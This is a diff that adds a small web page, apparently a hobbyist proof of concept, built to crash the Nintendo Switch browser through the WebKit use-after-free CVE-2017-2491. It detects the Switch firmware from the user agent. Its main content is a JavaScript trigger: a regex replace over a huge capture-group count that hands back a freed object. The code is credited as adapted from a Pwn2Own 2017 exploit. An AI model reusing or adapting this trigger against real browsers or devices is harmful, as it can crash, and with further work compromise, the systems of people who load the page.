@@ -1,0 +1,94 @@
+<!doctype html>
+<html>
+    <head>
+        <title>Crash my Switch! (2.2.0)</title>
+        <style>
+            body {font-size: 2em;}
+            a:hover {color: #f00; font-weight: bold;}
+            .title{
+                text-align: center;
+            }
+            footer {
+                position: absolute;
+                left: 0;
+                bottom: 0;
+                height: 50px;
+                width: 100%;
+                overflow:hidden;
+                font-size: 65%;
+            }
+            .firmware{
+                display:inline-block;
+            }
+            .stupidexplaination{
+                font-size: 80%;
+            }
+            .buttonWrapper{
+                margin:0 auto;
+                width:200px;
+                height:200px;
+                display: block;
+                font-size: 150%;
+            }
+
+        </style>
+    </head>
+    <body>
+        <div class="title">
+            <h1>An utterly useless webpage!</h1>
+            <p>Crashes your switch using by exploiting CVE-2017-2491/ZDI-17-231!</p><br/>
+            <p class="stupidexplaination"> (Made because I'm generally incompotent and have no idea how to get a valid JSCell header without somehow getting JSC to alloc my objects in the range of 0x800000000 and 0x8FFFFFFFF, which I'm not quite sure is possible on the switch!)</p>
+        </div>
+
+        <div class="buttonWrapper">
+            <a href='javascript:crash()'>Crash!</a>
+        </div>
+
+        <footer><div class="firmware"> Source basically stolen based from saelo & niklasb's <a href="https://phoenhex.re/2017-05-04/pwn2own17-cachedcall-uaf">Pwn2Own 2017 PoC</a> | Using firmware: <div class="firmware" id='firmware'></div></div></footer>
+            <script>
+                if(navigator.userAgent.indexOf('Nintendo Switch') != -1) {
+                    if(navigator.userAgent.indexOf('NF/4.0.0.5.9 NintendoBrowser/5.1.0.13341') != -1){
+                        document.getElementById('firmware').innerText = '2.0.0';
+                    } else if(navigator.userAgent.indexOf('NF/4.0.0.5.10 NintendoBrowser/5.1.0.13343') != -1){
+                        document.getElementById('firmware').innerText = '2.1.0-2.3.0';
+                    } else {
+                        document.getElementById('firmware').innerText = '>2.3.0';
+                    }
+                } else {
+                    document.getElementById('firmware').innerText = 'WTF is this not even a switch? You monster.';
+                }
+
+                function crash_exploit() {
+                    var n = 0x12500;
+                    var m = 10;
+                    var regex = new RegExp("(ab)".repeat(n), "g");
+                    var part = "ab".repeat(n);
+                    var s = (part + "|").repeat(m);
+
+                    while (true) {
+                        var cnt = 0;
+                        var ary = [];
+                        s.replace(regex, function() {    
+                            for (var i = 1; i < arguments.length-2; ++i) {
+                                if (typeof arguments[i] !== 'string') {
+                                    freed = arguments[i];
+                                    alert("Press ok to crash")
+                                    alert(freed)
+                                }
+                                ary[cnt++] = arguments[i];
+                            }
+                            return "x";
+                        });
+
+                    }
+                }
+
+                function crash(){
+                    alert("Starting after this alert, please allow a few seconds.")
+                    crash_exploit()
+                }
+
+            </script>
+    </body>
+</html>
+
